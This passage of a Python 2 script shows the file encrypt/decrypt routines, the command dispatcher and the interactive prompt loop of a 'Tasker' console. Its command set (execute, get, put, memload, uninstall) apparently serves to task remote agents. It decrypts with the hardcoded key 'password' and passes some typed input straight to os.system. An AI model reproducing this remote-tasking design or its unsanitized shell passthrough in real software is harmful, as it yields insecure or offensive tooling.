	#text_file = zlib.compress(file_read, 9)
	#file_write = open(file_encrypt, 'wb')
	#file_write.write(text_file)
	#file_write.close()

	print "%s[+]%s File Script Plain-Text: %s" %(CGREEN, CEND, file_decrypt)
	print "%s[+]%s File Encrypt and Compress: %s" %(CGREEN, CEND, file_encrypt)
	return


def decrypt(arrCommand):
	if len(arrCommand) == 1 or (arrCommand[1].lower() in ('-h', 'help')) :
		print __decrypt__
		return

	if not os.path.exists(arrCommand[1]):
		print "%s[-]%s File '%s' not exists!" %(CRED, CEND, arrCommand[1])
		return
	
	#Decrypt File
	file_encrypt = arrCommand[1]
	file_decrypt = os.path.splitext(arrCommand[1])[0] + '.txt'
	file_read = open(file_encrypt, 'rb').read()
	text_file = decryption(file_read, "password")
	
	if text_file is not None:
		file_write = open(file_decrypt, 'w')
		file_write.write(text_file)
		file_write.close()
	else:
		return
	
	#Decompress File
	#file_encrypt = arrCommand[1]
	#file_decrypt = os.path.splitext(arrCommand[1])[0] + '.txt'
	#file_read = open(file_encrypt, 'rb').read()
	#file_read = file_read.replace('\r\n', '\n')
	#text_file = zlib.decompress(file_read)
	#file_write = open(file_decrypt, 'w')
	#file_write.write(text_file)
	#file_write.close()

	print "%s[+]%s File Encrypt and Compress: %s" %(CGREEN, CEND, file_encrypt)
	print "%s[+]%s File Script Plain-Text: %s" %(CGREEN, CEND, file_decrypt)
	return

def exeCommand(command):
	if command is None or command == "":
		return
	
	#split commands with shlex
	#arrCommand = shlex.split(command)

	try:
		if command.endswith("\\"):
			command = command + "\\"
		elif command.endswith('\\"'):
			command = command[:-1] + '\\"'
		arrCommand = shlex.split(command)
	except:
		print "%s[-]%s Command invalid: %s. Type help or ? to list commands." %(CRED, CEND, command)
		return
 	
	if arrCommand[0].lower() == "exit" or arrCommand[0].lower() == "bye":
		print "Exit the tasker... bye bye"
		return
	elif arrCommand[0].lower() == "?":
		print __help_command__
		return
	elif arrCommand[0].lower() == "help":
		print __help__
		return
	elif arrCommand[0].lower() == "list":
		_list(arrCommand)
		return
	elif arrCommand[0].lower() == "receipt":
		receipt(arrCommand)
		return
	elif arrCommand[0].lower() == "generate":
		generate(arrCommand)
		return
	elif arrCommand[0].lower() == "rm":
		rm(arrCommand)
		return
	elif arrCommand[0].lower() == "import":
		_import(arrCommand)
		return
	elif arrCommand[0].lower() == "id":
		_id(arrCommand)
		return
	elif arrCommand[0].lower() == "show":
		show(arrCommand)
		return
	elif arrCommand[0].lower() == "use":
		use(arrCommand)
		return
	elif arrCommand[0].lower() == "execute":
		execute(arrCommand)
		return
	elif arrCommand[0].lower() == "get":
		get(arrCommand)
		return
	elif arrCommand[0].lower() == "put":
		put(arrCommand)
		return
	elif arrCommand[0].lower() == "memload":
		memload(arrCommand)
		return
	elif arrCommand[0].lower() == "memunload":
		memunload(arrCommand)
		return
	elif arrCommand[0].lower() == "set":
		_set(arrCommand)
		return
	elif arrCommand[0].lower() == "delete":
		delete(arrCommand)
		return
	elif arrCommand[0].lower() == "uninstall":
		uninstall(arrCommand)
		return
	elif arrCommand[0].lower() == "encrypt":
		encrypt(arrCommand)
		return
	elif arrCommand[0].lower() == "decrypt":
		decrypt(arrCommand)
		return
	elif arrCommand[0].lower() in ("ls", "dir", "find","clear"):
		print "%s[*]%s exec: %s" %(CBLUE, CEND, command)
		os.system(command)
		return
	else:
		print "%s[-]%s Unknown command: %s. Type help or ? to list commands." %(CRED, CEND, arrCommand[0])
		return

	print "\narrCommand:: " + str(arrCommand)

def tasker():
	command = ''
	
	completer = Completer(_exec_command)
	readline.set_completer(completer.complete)
	readline.set_completer_delims(" ")
	readline.parse_and_bind('set editing-mode vi')
	readline.parse_and_bind("tab: complete")

	global _parentId
	global _childId

	#_parentId = "test2"
	#_childId = "0800"

	while (command.lower() != "exit" and command.lower() != "bye"):
		try:
			command = raw_input("Tasker::[%s]::[%s] > " %(_parentId, _childId))
			exeCommand(command)
		except KeyboardInterrupt:
		    print " - Exit... bye bye"
		    sys.exit()

def main():
	os.system('clear')

	global _opts
	_opts = get_args()

	#init tasker
	initTasker()

	#tasker
  	tasker()	

if __name__ == '__main__':
	main()
